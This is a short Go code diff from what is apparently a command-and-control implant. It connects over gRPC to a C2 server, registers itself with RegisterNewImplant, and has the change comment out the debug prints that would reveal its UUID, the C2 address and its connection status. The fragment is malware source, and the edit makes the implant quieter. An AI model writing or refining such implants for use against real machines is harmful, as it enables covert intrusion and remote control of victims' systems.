@@ -37,8 +37,8 @@ func main() {
 		client grpcapi.ImplantClient //created generically from the protoc compiler.
 	)
 	//debug print statement, making sure the build command works
-	fmt.Printf("[:] UUID is: %s\n", uuid)
-	fmt.Printf("[:] C2 server: %s:%s\n", ip, port_str)
+	//fmt.Printf("[:] UUID is: %s\n", uuid)
+	//fmt.Printf("[:] C2 server: %s:%s\n", ip, port_str)
 	//convert port str to portnum
 	port_num, err := strconv.Atoi(port_str) //maybe just call this some other way, I'm lazy tho
 	if err != nil {
@@ -63,7 +63,7 @@ func main() {
 			//log.Fatal(err)
 		} else {
 			//debug print
-			fmt.Println("[+] Connection Success")
+			//fmt.Println("[+] Connection Success")
 			break
 		}
 	}
@@ -77,7 +77,7 @@ func main() {
 	_, err = client.RegisterNewImplant(ctx, reg_req) //set with balnk identifier, IDC what this outputs.
 	//fmt.Printf("%s\n", output.)
 	if err != nil {
-		fmt.Println("[-] Fatal error in registering implant!")
+		//fmt.Println("[-] Fatal error in registering implant!")
 		log.Fatal(err)
 	}
 
